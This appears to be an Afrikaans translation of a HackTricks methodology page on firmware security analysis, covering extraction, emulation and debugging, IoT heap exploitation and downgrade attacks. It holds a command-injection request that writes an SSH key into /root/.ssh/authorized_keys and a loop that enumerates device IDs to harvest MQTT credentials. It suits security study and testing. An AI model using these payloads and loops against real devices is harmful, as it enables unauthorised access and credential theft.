# Firmware-analise

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Inleiding**

### Verwante hulpbronne

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle in staat stel om korrek te werk deur kommunikasie tussen die hardewarekomponente en die sagteware waarmee gebruikers werk, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, wat verseker dat die toestel toegang tot belangrike instruksies het sodra dit aangeskakel word, sodat die bedryfstelsel kan begin. Die ondersoek en moontlike wysiging van firmware is ’n kritieke stap om sekuriteitskwesbaarhede te identifiseer.<sup>[[2]](#references)[[3]](#references)</sup>

## **Inligting insamel**

**Inligting insamel** is ’n kritieke eerste stap om die samestelling van ’n toestel en die tegnologieë wat dit gebruik, te verstaan. Hierdie proses behels die insameling van data oor:

- Die CPU-argitektuur en die bedryfstelsel waarop dit loop
- Besonderhede oor die selflaaiprogram
- Hardeware-uitleg en datablaaie
- Kodebasisstatistieke en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifisering
- Argitektuur- en vloeidiagramme
- Sekuriteitsbeoordelings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)**-nutsmiddels van onskatbare waarde, asook die ontleding van enige beskikbare open-source-sagtewarekomponente deur middel van handmatige en geoutomatiseerde hersieningsprosesse. Nutsmiddels soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese ontleding wat gebruik kan word om moontlike probleme te vind.

## **Firmware verkry**

Firmware kan op verskeie maniere verkry word, elk met sy eie kompleksiteitsvlak:

- **Direk** van die bron (ontwikkelaars, vervaardigers)
- Deur dit te **bou** volgens die verskafde instruksies
- Deur dit van amptelike ondersteuningswebwerwe af te **laai**
- Deur **Google dork**-navrae te gebruik om gehoste firmwarelêers te vind
- Deur direk toegang tot **cloud storage** te kry, met nutsmiddels soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Deur **opdaterings** met man-in-the-middle-tegnieke te onderskep
- Deur dit uit die toestel te **onttrek** via verbindings soos **UART**, **JTAG** of **PICit**
- Deur opdateringsversoeke in toestelkommunikasie te **snuffel**
- Deur **hardcoded-opdateringseindpunte** te identifiseer en te gebruik
- Deur dit uit die selflaaiprogram of netwerk te **dump**
- Deur die stoorskyfie te **verwyder en uit te lees** wanneer niks anders werk nie, met behulp van geskikte hardewarenutsmiddels

### Slegs UART-logboeke: dwing ’n root shell af via U-Boot-omgewingsveranderlike in flitsgeheue

As UART RX geïgnoreer word (slegs logboeke), kan jy steeds ’n init shell afdwing deur die **U-Boot-omgewingsblob** vanlyn te **wysig**:<sup>[[6]](#references)</sup>

1. Dump SPI-flitsgeheue met ’n SOIC-8-knip en programmeerder (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Vind die U-Boot env-partisie, wysig `bootargs` om `init=/bin/sh` in te sluit, en **bereken die U-Boot env CRC32 vir die blob weer**.
3. Flits slegs die env-partisie weer en herlaai; ’n shell behoort op UART te verskyn.

Dit is nuttig op ingebedde toestelle waar die bootloader shell gedeaktiveer is, maar die env-partisie via eksterne flash-toegang geskryf kan word.

## Ontleding van die firmware

Noudat jy **die firmware het**, moet jy inligting daaroor onttrek om te weet hoe om dit te hanteer. Verskillende tools wat jy hiervoor kan gebruik:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

As jy nie veel met daardie nutsgoed vind nie, kontroleer die **entropie** van die image met `binwalk -E <bin>`; as die entropie laag is, is dit waarskynlik nie geënkripteer nie. As die entropie hoog is, is dit waarskynlik geënkripteer (of op een of ander manier saamgepers).

Jy kan ook hierdie nutsgoed gebruik om **lêers wat in die firmware ingebed is** te onttrek:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of gebruik [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te inspekteer.

### Verkryging van die lêerstelsel

Met die nutsgoed wat vroeër bespreek is, soos `binwalk -ev <bin>`, behoort jy die **lêerstelsel te kon onttrek**.\
Binwalk onttrek dit gewoonlik in ’n **lêergids met die lêerstelseltipe as naam**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige onttrekking van die lêerstelsel

Soms sal binwalk **nie die magic byte van die lêerstelsel in sy handtekeninge hê nie**. Gebruik in sulke gevalle binwalk om **die offset van die lêerstelsel te vind en die saamgeperste lêerstelsel uit die binêre lêer te carve**, en **onttrek die lêerstelsel handmatig** volgens die tipe daarvan deur die stappe hieronder te volg.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Voer die volgende **dd command** uit om die Squashfs-lêerstelsel uit te kerf.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (wat in die voorbeeld hierbo gebruik word)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die "`squashfs-root`"-gids wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND-flitsgeheue

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware ontleed

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om die struktuur en moontlike kwesbaarhede daarvan te verstaan. Hierdie proses behels die gebruik van verskeie nutsmiddels om waardevolle data uit die firmwarebeeld te ontleed en te onttrek.

### Aanvanklike ontledingsnutsmiddels

’n Stel opdragte word verskaf vir aanvanklike inspeksie van die binêre lêer (hierna `<bin>` genoem). Hierdie opdragte help om lêertipes te identifiseer, stringe te onttrek, binêre data te ontleed en die besonderhede van partisies en lêerstelsels te verstaan:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Om die enkripsiestatus van die image te bepaal, word die **entropy** met `binwalk -E <bin>` nagegaan. Lae entropy dui op ’n gebrek aan enkripsie, terwyl hoë entropy op moontlike enkripsie of kompressie dui.

Vir die onttrekking van **ingebedde lêers** word nutsgoed en hulpbronne soos die dokumentasie vir **file-data-carving-recovery-tools** en **binvis.io** vir lêerinspeksie aanbeveel.

### Onttrekking van die lêerstelsel

Met `binwalk -ev <bin>` kan ’n mens gewoonlik die lêerstelsel onttrek, dikwels na ’n gids wat na die lêerstelseltipe vernoem is (bv. squashfs, ubifs). Wanneer **binwalk** egter nie die lêerstelseltipe weens ontbrekende magic bytes kan herken nie, is handmatige onttrekking nodig. Dit behels dat `binwalk` gebruik word om die lêerstelsel se offset te vind, waarna die `dd`-opdrag gebruik word om die lêerstelsel uit te kerf:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daarna word verskillende opdragte gebruik om die inhoud handmatig uit te pak, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs).

### Lêerstelselontleding

Sodra die lêerstelsel uitgepak is, begin die soektog na sekuriteitsfoute. Daar word aandag gegee aan onveilige netwerkdaemone, hardgekodeerde geloofsbriewe, API-eindpunte, opdateringbedienerfunksies, ongecompileerde kode, opstartscripte en gecompileerde binêre lêers vir vanlyn ontleding.

**Sleutelliggings** en **items** om te inspekteer, sluit in:

- **etc/shadow** en **etc/passwd** vir gebruikersgeloofsbriewe
- SSL-sertifikate en -sleutels in **etc/ssl**
- Konfigurasie- en scriptlêers vir moontlike kwesbaarhede
- Ingebedde binêre lêers vir verdere ontleding
- Algemene IoT-toestelwebbedieners en binêre lêers

Verskeie nutsmiddels help om sensitiewe inligting en kwesbaarhede in die lêerstelsel te vind:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) om na sensitiewe inligting te soek
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-ontleding
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese ontleding

### Sekuriteitskontroles van gecompileerde binêre lêers

Beide bronkode en gecompileerde binêre lêers wat in die lêerstelsel gevind word, moet vir kwesbaarhede ondersoek word. Nutsmiddels soos **checksec.sh** vir Unix-binêre lêers en **PESecurity** vir Windows-binêre lêers help om onbeskermde binêre lêers te identifiseer wat uitgebuit kan word.

## Verkryging van wolkkonfigurasie en MQTT-geloofsbriewe via tokens wat van URL's afgelei word

Baie IoT-hubs haal hul toestelspesifieke konfigurasie van 'n wolkeindpunt af wat soos volg lyk:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-ontleding kan jy ontdek dat `<token>` plaaslik van die toestel-ID afgelei word met behulp van 'n hardgekodeerde geheim, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) en voorgestel as hoofletter-heksadesimaal

Hierdie ontwerp stel enigiemand wat 'n deviceId en die STATIC_KEY ken in staat om die URL te rekonstrueer en die wolkkonfigurasie af te laai, wat dikwels MQTT-geloofsbriewe in gewone teks en onderwerpvoorvoegsels blootlê.

Praktiese werksvloei:

1) Onttrek deviceId uit UART-opstartlogboeke

- Koppel 'n 3.3V UART-adapter (TX/RX/GND) aan en neem die logboeke vas:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Soek na lyne wat die URL-patroon vir wolkkonfigurasie en brokeradres afdruk, byvoorbeeld:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek na die config-pad ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Lei die token in Bash af en skakel die digest na hoofletters om:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Versamel cloud-konfigurasie en MQTT-geloofsbriewe

- Stel die URL saam en haal JSON op met curl; ontleed dit met jq om geheime te onttrek:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Misbruik plaintext MQTT en swak topic-ACL's (indien teenwoordig)

- Gebruik herwonne credentials om op maintenance-topics in te teken en na sensitiewe gebeurtenisse te soek:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerasie van voorspelbare toestel-ID's (op skaal, met magtiging)

- Baie ekosisteme sluit verkoper-OUI-/produk-/tipegrepe in, gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's iteratief deurloop, tokens aflei en konfigurasies programmaties ophaal:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Aantekeninge
- Verkry altyd uitdruklike toestemming voordat jy massale enumerasie probeer.
- Verkies emulering of statiese analise om geheime te herwin sonder om teikenhardeware te wysig, waar moontlik.


Die emulering van firmware maak **dynamic analysis** van óf ’n toestel se werking óf ’n individuele program moontlik. Hierdie benadering kan uitdagings met hardeware- of argitektuurafhanklikhede teëkom, maar die oordrag van die root filesystem of spesifieke binaries na ’n toestel met ’n ooreenstemmende argitektuur en endianness, soos ’n Raspberry Pi, of na ’n voorafgeboude virtuele masjien, kan verdere toetsing vergemaklik.

### Emulering van individuele binaries

Wanneer jy enkele programme ondersoek, is dit noodsaaklik om die program se endianness en SVE-argitektuur te bepaal.

#### Voorbeeld met MIPS-argitektuur

Om ’n binêre lêer met MIPS-argitektuur te emuleer, kan jy die volgende opdrag gebruik:

```bash
file ./squashfs-root/bin/busybox
```

En om die nodige emulasienutsgoed te installeer:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian-binêre lêers is `qemu-mipsel` die gepaste keuse.

#### ARM-argitektuur-emulasie

Vir ARM-binêre lêers is die proses soortgelyk, met die `qemu-arm`-emulator wat vir emulasie gebruik word.

### Volledige stelsel-emulasie

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) en ander maak volledige firmware-emulasie moontlik deur die proses te outomatiseer en met dinamiese analise te help.

## Dinamiese analise in die praktyk

Op hierdie stadium word óf ’n werklike óf ’n geëmuleerde toestelomgewing vir analise gebruik. Dit is noodsaaklik om shell-toegang tot die bedryfstelsel en lêerstelsel te behou. Emulasie boots hardeware-interaksies moontlik nie perfek na nie, wat dit soms nodig maak om die emulasie te herbegin. Die analise behoort die lêerstelsel weer te ondersoek, blootgestelde webblaaie en netwerkdienste te ontgin en kwesbaarhede in die selflaaiprogram te verken. Firmware-integriteitstoetse is noodsaaklik om moontlike agterdeurkwesbaarhede te identifiseer.

## Runtime-analise-tegnieke

Runtime-analise behels interaksie met ’n proses of binêre lêer in sy bedryfsomgewing, met behulp van gereedskap soos gdb-multiarch, Frida en Ghidra om breekpunte te stel en kwesbaarhede deur fuzzing en ander tegnieke te identifiseer.

Vir ingebedde teikens sonder ’n volledige ontfouter, **kopieer ’n staties-gekoppelde `gdbserver`** na die toestel en koppel op afstand daaraan:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor-boodskapkartering

Op IoT-hubs word die RF-stapel dikwels tussen ’n **radio-MCU** en ’n Linux-userland-proses verdeel. ’n Nuttige werkvloei is om die pad te karteer:<sup>[[8]](#references)</sup>

1. **RF-raam** oor die lug
2. **beheerderkant-ontleder** op die radio-MCU
3. **seriële/UART-teks- of TLV-protokol** wat na Linux aangestuur word (byvoorbeeld `/dev/tty*`)
4. **toepassingsdispatcher** in die hoofdemon
5. **protokolspesifieke hanteerder / toestandsmasjien**

Hierdie argitektuur skep twee teikens vir reverse engineering in plaas van een. As die beheerder binêre radioprames omskakel na ’n teksprotokol soos `Group,Command,arg1,arg2,...`, bepaal:

- Die **boodskapgroepe** en dispatch-tabelle
- Watter boodskappe van die **netwerk** kan kom teenoor die beheerder self
- Die presiese **vervaardigerspesifieke onderskeidingsvelde** (byvoorbeeld Zigbee `manufacturer_code` en pasgemaakte `cluster_command`)
- Watter hanteerders slegs bereikbaar is tydens **commissioning**, ontdekking of aflaaifases van firmware/modelle

Vir Zigbee spesifiek, neem paringsverkeer op en kyk of die teiken steeds op die verstek-**Link Key** `ZigBeeAlliance09` staatmaak. Indien wel, kan die afluistering van commissioning-verkeer die **Network Key** blootlê. Zigbee 3.0-installasiekodes verminder hierdie blootstelling; let dus op of die getoetste toestel dit werklik afdwing.

### Vervaardigerspesifieke protokolhanteerders en FSM-beheerde bereikbaarheid

Vervaardigerspesifieke Zigbee/ZCL-opdragte is dikwels ’n beter teiken as gestandaardiseerde clusters, omdat hulle **pasgemaakte ontledingskode** en interne **FSM’s** bereik met minder deeglik getoetste validering.<sup>[[8]](#references)</sup>

Praktiese werkvloei:

- Reverse-engineer die opdragdispatcher totdat jy die **hanteerder wat slegs vir die vervaardiger bedoel is** vind.
- Bepaal die tabelle vir **FSM-toestand**, **gebeurtenis**, **kontrole**, **aksie** en **volgende toestand**.
- Identifiseer **oorgangstoestande** wat outomaties voortgaan, asook hertak- en foutvertakkings wat uiteindelik aanvallerbeheerde toestand terugstel of vrystel.
- Bevestig watter wettige protokoluitruilings nodig is om die daemoon in die kwesbare toestand te plaas, eerder as om aan te neem dat die foutiewe hanteerder altyd bereikbaar is.

Vir tydsensitiewe protokolle kan pakketherhaling vanaf ’n Python-raamwerk te stadig wees. ’n Betroubaarder benadering is om ’n wettige toestel op werklike hardeware (byvoorbeeld ’n **nRF52840**) met ’n vervaardigervlak-stapel na te boots, sodat jy die korrekte **endpoints**, **attribute** en commissioning-tydsberekening kan blootlê.

### Foutklas vir gefragmenteerde aflaaie in ingebedde daemons

’n Herhalende firmware-foutklas kom voor in **gefragmenteerde blob-/model-/konfigurasie-aflaaie**:<sup>[[8]](#references)</sup>

1. Die **eerste fragment** (`offset == 0`) stoor `ctx->total_size` en allokeer `malloc(total_size)`.
2. Latere fragmente valideer slegs die aanvallerbeheerde **pakketplaaslike** velde, soos `packet_total_size >= offset + chunk_len`.
3. Die kopie gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om teen die **oorspronklik geallokeerde grootte** te kontroleer.

Dit laat ’n aanvaller toe om:

- ’n Geldige eerste fragment met ’n **klein** verklaarde totale grootte te stuur om ’n klein heap-toekenning af te dwing.
- ’n Latere fragment met die **verwagte offset**, maar ’n groter `chunk_len`, te stuur.
- ’n vervalste pakketplaaslike grootte te gebruik wat aan die nuwe kontroles voldoen, terwyl die oorspronklik geallokeerde buffer steeds oorloop.

Wanneer die kwesbare pad agter commissioning-logika sit, moet die uitbuiting genoeg **toestelnabootsing** insluit om die teiken in die verwagte modelaflaai- of blobaflaaitoestand te kry voordat die misvormde fragmente gestuur word.

### Protokolgedrewe `free()`-snellers

In ingebedde daemons is die maklikste manier om heap-metadata-uitbuiting te aktiveer dikwels nie om “vir opruiming te wag” nie, maar om die protokol se eie **fouthantering af te dwing**:<sup>[[8]](#references)</sup>

- Stuur misvormde opvolgfragmente om die FSM na **hertak-** of **fouttoestande** te dryf.
- Oorskry die hertakdrempel sodat die daemoon die **konteks terugstel** en die beskadigde buffer vrystel.
- Gebruik hierdie voorspelbare `free()` om primitiewe aan die toekennerkant te aktiveer voordat die proses om onverwante redes ineenstort.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-agtige** toekenners in ingebedde Linux, waar die beskadiging van stukmetadata unlink/unbin-logika in ’n skryfprimitief kan omskep. ’n Stabiele patroon is om ’n **grootteveld** te beskadig om die deurkruising van die toekenner na **vals stukke wat binne die oorvol buffer geplaas is** te herlei, eerder as om werklike bin-wysers onmiddellik te beskadig en die proses te laat ineenstort.

## Binêre uitbuiting en Proof-of-Concept

Die ontwikkeling van ’n PoC vir geïdentifiseerde kwesbaarhede vereis ’n diepgaande begrip van die teikenargitektuur en programmering in laervlaktale. Binêre looptydbeskermings is skaars in ingebedde stelsels, maar wanneer hulle teenwoordig is, kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc-fastbin-uitbuitingsnotas (ingebedde Linux)

- **Fastbins + konsolidasie:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere groot toekenning kan `__malloc_consolidate()` aktiveer, dus moet enige vals stuk die kontroles slaag (redelike grootte, `fd = 0` en omliggende stukke wat as “in gebruik” beskou word).<sup>[[6]](#references)</sup>
- **Nie-PIE-binaries onder ASLR:** as ASLR geaktiveer is, maar die hoofbinêre lêer **nie-PIE** is, is adresse in die binêre lêer se `.data/.bss` stabiel. Jy kan ’n gebied teiken wat reeds soos ’n geldige heap-stukkop lyk om ’n fastbin-toekenning op ’n **funksiewysertabel** te laat beland.
- **NUL wat die ontleder stop:** wanneer JSON ontleed word, kan ’n `\x00` in die loonvrag die ontleding stop terwyl daaropvolgende aanvallerbeheerde grepe behoue bly vir ’n stapelspil/ROP-ketting.
- **Shellcode via `/proc/self/mem`:** ’n ROP-ketting wat `open("/proc/self/mem")`, `lseek()` en `write()` aanroep, kan uitvoerbare shellcode in ’n bekende kartering plaas en daarna daarheen spring.

## Voorbereide bedryfstelsels vir firmware-analise

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied voorafopgestelde omgewings vir firmware-sekuriteitstoetsing, toegerus met die nodige nutsgoed.

## Voorbereide bedryfstelsels vir firmware-analise

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n distro wat bedoel is om jou te help met sekuriteitsbeoordeling en penetrasietoetsing van Internet of Things (IoT)-toestelle. Dit bespaar jou baie tyd deur ’n voorafopgestelde omgewing met al die nodige nutsgoed te verskaf.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): ’n Bedryfstelsel vir ingebedde sekuriteitstoetsing, gebaseer op Ubuntu 18.04 en vooraf gelaai met nutsgoed vir firmware-sekuriteitstoetsing.

## Firmware-afgraderingsaanvalle en onveilige opdateringsmeganismes

Selfs wanneer ’n vervaardiger kriptografiese handtekeningkontroles vir firmwarebeelde implementeer, word **beskerming teen weergawe-terugrol (afgradering)** dikwels weggelaat. Wanneer die selflaai- of herstel-laaier slegs die handtekening met ’n ingebedde publieke sleutel verifieer, maar nie die *weergawe* (of ’n monotone teller) van die beeld wat geflits word vergelyk nie, kan ’n aanvaller wettiglik ’n **ouer, kwesbare firmware met ’n steeds geldige handtekening installeer** en sodoende reggestelde kwesbaarhede weer invoer.<sup>[[4]](#references)</sup>

Tipiese aanvalswerkvloei:

1. **Verkry ’n ouer beeld met ’n geldige handtekening**
   * Kry dit van die vervaardiger se openbare aflaaipoortaal, CDN of ondersteuningswerf.
   * Onttrek dit uit gepaardgaande mobiele-/lessenaartoepassings (bv. binne ’n Android-APK onder `assets/firmware/`).
   * Kry dit van derdeparty-bewaarplekke soos VirusTotal, internetargiewe, forums, ens.
2. **Laai die beeld op na, of bedien dit aan, die toestel** via enige blootgestelde opdateringskanaal:
   * Web-UI, mobiele-toepassing-API, USB, TFTP, MQTT, ens.
   * Baie IoT-toestelle vir verbruikers bied *ongeverifieerde* HTTP(S)-eindpunte wat Base64-geënkodeerde firmware-blobs aanvaar, dit aan die bedienerkant dekodeer en herstel/opgradering aktiveer.
3. Nadat die firmware afgegradeer is, buit ’n kwesbaarheid uit wat in die nuwer weergawe reggestel is (byvoorbeeld ’n opdraginspuitingsfilter wat later bygevoeg is).
4. Opsioneel, flits die nuutste beeld terug of deaktiveer opdaterings om opsporing te vermy nadat volharding verkry is.

### Voorbeeld: Opdraginspuiting ná afgradering

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In die kwesbare (afgegradeerde) firmware word die `md5`-parameter direk en sonder sanitisering by ’n shell-opdrag gevoeg, wat inspuiting van arbitrêre opdragte moontlik maak (hiermee word roottoegang op grond van SSH-sleutels geaktiveer). Latere firmwareweergawes het ’n basiese karakterfilter ingestel, maar omdat afgraderingsbeskerming ontbreek, is die regstelling nutteloos.<sup>[[4]](#references)</sup>

### Onttrekking van firmware uit mobiele toepassings

Baie verskaffers sluit volledige firmwarebeelde by hul gepaardgaande mobiele toepassings in, sodat die toepassing die toestel via Bluetooth/Wi-Fi kan opdateer. Hierdie pakkette word gewoonlik ongeënkripteer in die APK/APEX gestoor, onder paaie soos `assets/fw/` of `res/raw/`. Met nutsmiddels soos `apktool`, `ghidra` of selfs gewone `unzip` kan jy ondertekende beelde uittrek sonder om aan die fisiese hardeware te raak.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass van anti-rollback wat slegs in updater-logika vir A/B-slotontwerpe voorkom

Sommige vendors implementeer wel ’n anti-downgrade **ratchet**, maar slegs binne die *updater*-logika (byvoorbeeld ’n UDS-roetine oor CAN, ’n recovery-opdrag of ’n userspace OTA-agent). As die **bootloader** later net die image se handtekening/CRC kontroleer en die partisietabel of slotmetadata vertrou, kan rollback-beskerming steeds omseil word.<sup>[[7]](#references)</sup>

Tipiese swak ontwerp:

- Firmware-metadata bevat beide ’n weergawebeskrywer en ’n **security ratchet** / monotone teller.
- Die updater vergelyk die image se ratchet met ’n waarde wat in persistente berging gestoor is en verwerp ouer, getekende images.
- Die bootloader **parseer** nie daardie ratchet nie en verifieer slegs die kopskrif, CRC en handtekening voordat dit die gekose slot selflaai.
- Slotaktivering word apart in ’n partisietabel of per-slot-generasieteller gestoor en is **nie kriptografies gebind** aan die presiese firmware-digest wat gevalideer is nie.

Dit skep ’n **valideer-een-image / selflaai-’n-ander-image**-primitief in dubbel-slotstelsels. As die aanvaller die updater kan laat merk dat slot B die volgende selflaaiteiken is deur ’n huidige, getekende image te gebruik, en slot B later voor die herlaai kan oorskryf, kan die bootloader steeds die afgegradeerde image selflaai omdat dit net die reeds vasgelegde slotmetadata vertrou.

Algemene misbruikpatroon:

1. Laai ’n **huidige, getekende** firmware na die passiewe slot op en voer die normale validasie-/skakelroetine uit sodat die uitleg daardie slot as die volgende aktiewe slot merk.
2. **Moenie nog herlaai nie**. Gaan in dieselfde sessie weer na die slotvoorbereidings-/uitveerroetine.
3. Misbruik verouderde selflaaitoestand- of slotkeurlogika sodat die updater **dieselfde fisiese slot** uitvee wat pas bevorder is.
4. Skryf ’n **ouer, maar steeds getekende** firmware na daardie slot.
5. Slaan die validasieroetine wat die ratchet afdwing oor en herlaai direk.
6. Die bootloader kies die bevorderde slot, verifieer slegs die handtekening/integriteit en selflaai die ou image.

Dinge waarna jy moet kyk wanneer jy A/B-opdateringsimplementasies reverse engineer:

- Slotkeuse wat afgelei word van **selflaaitydvlae** wat nie ná ’n suksesvolle skakeling hernu word nie.
- ’n Roetine soos `prepare_passive_slot()` wat ’n slot uitvee op grond van verouderde toestand in plaas van die **huidige vasgelegde uitleg**.
- ’n Funksie soos `part_write_layout()` wat net ’n **generasieteller** / aktiewe vlag verhoog en nie die gevalideerde image-hash stoor nie.
- Ratchet-kontroles wat in userspace- of updater-kode geïmplementeer is, maar **nie** in ROM-/bootloader-/secure-boot-stadiums nie.
- Uitvee- of recovery-roetines wat die slot as selflaaibaar gemerk laat selfs nadat die inhoud daarvan verwyder en herskryf is.

### Kontrolelys vir die beoordeling van opdateringslogika

* Is die vervoer/verifikasie van die *opdateringsendpoint* voldoende beskerm (TLS + verifikasie)?
* Vergelyk die toestel **weergawenommers** of ’n **monotone anti-rollback-teller** voordat dit flits?
* Word die image binne ’n secure-boot-ketting geverifieer (bv. handtekeninge wat deur ROM-kode nagegaan word)?
* Dwing die **bootloader dieselfde ratchet as die updater af**, eerder as om net die handtekening/CRC na te gaan?
* Is slotaktiveringsmetadata **gebonde aan die gevalideerde firmware-digest/weergawe**, of kan ’n slot gewysig word nadat dit bevorder is?
* Word die toestel ná ’n suksesvolle slotskakeling gedwing om te herlaai, of is latere opdaterings-/uitveerroetines steeds in dieselfde sessie bereikbaar?
* Voer userland-kode bykomende gesondeverstandkontroles uit (bv. toegelate partisietoewysing, modelnommer)?
* Hergebruik *gedeeltelike* of *rugsteun*-opdateringsvloeie dieselfde validasielogika?

> 💡  As enige van die bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback-aanvalle.

## Kwesbare firmware om mee te oefen

Gebruik die volgende kwesbare firmwareprojekte as ’n beginpunt om kwesbaarhede in firmware te leer ontdek.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
